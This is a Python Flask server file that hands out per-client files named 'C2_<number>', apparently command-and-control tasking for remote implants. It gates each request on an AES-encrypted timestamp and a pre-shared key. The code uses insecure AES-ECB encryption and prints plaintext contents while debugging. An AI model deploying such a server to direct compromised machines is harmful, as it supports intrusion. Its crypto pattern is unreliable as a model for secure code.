from json.decoder import JSONDecodeError
from flask import Flask
from flask import send_file
from flask import request
from flask import Response
from datetime import datetime
from datetime import timezone
import json
from Crypto.Cipher import AES
import base64
from pypadding import pkcs
import time

app = Flask(__name__)

@app.route("/<number>", methods = ['POST'])
def handle_n_serve(number):
    if request.method == 'POST':
        encrypted_content = request.get_data()  
        f = open('permission.json')
        data = json.load(f)
        for i in data['clients']:
            if(i['id']==int(number) and i['is_valid']==True):
                filename = i['keyfile']
                psk = getPSK(filename)
                try:
                    jsoncontent = decrypt_requestBody(encrypted_content, psk)
                except (JSONDecodeError, UnicodeDecodeError):
                    print("Wrong key")
                    return Response('Invalid client', 401, {'Connection':'close'})
                if(check_time(jsoncontent["timestamp"])):
                    newfile = encryptFile("./C2_" + number, psk)
                    ### 
                    # just for debugging
                    with open(newfile, "rb") as file:
                        # read the encrypted data
                        encrypted_data = file.read()
                        print(encrypted_data)
                    ###
                    return send_file(newfile, as_attachment=True)
                else:
                    print('Request time too old')
                    return Response('Request time too old', 408, {'Connection':'close'})
        print("Invalid client")
        return Response('Invalid client', 401, {'Connection':'close'})

def encryptFile(filename, psk):
    with open(filename, "rb") as file:
        original = file.read()
    print(original)
    cipher = AES.new(psk, AES.MODE_ECB)
    encoder = pkcs.Encoder(16)
    original_padded = encoder.encode(original)
    print(len(original))
    print(original_padded)
    print(len(original_padded))
    encrypted_content = cipher.encrypt(original_padded)
    newfile = filename + "_encrypted"
    with open(newfile, "wb") as file:
        file.write(base64.b64encode(encrypted_content))
    return newfile

def getPSK(filename):
    keyfile = open(filename, "rb")
    psk = keyfile.read()
    return psk

def check_time(datetime_req):
    formatted_datetime = datetime.strptime(datetime_req, '%d/%m/%y %H:%M:%S.%f')
    now = datetime.utcnow()
    return (now - formatted_datetime).total_seconds() <= 60 and (now - formatted_datetime).total_seconds() >= 0 

def decrypt_requestBody(payload, psk):
    decipher = AES.new(psk, AES.MODE_ECB)
    content = decipher.decrypt(base64.b64decode(payload))
    encoder = pkcs.Encoder()
    content = encoder.decode(content)
    jsoncontent = json.loads(content.decode('utf-8'))
    return jsoncontent

if __name__ == "__main__":
    app.run(host='0.0.0.0')
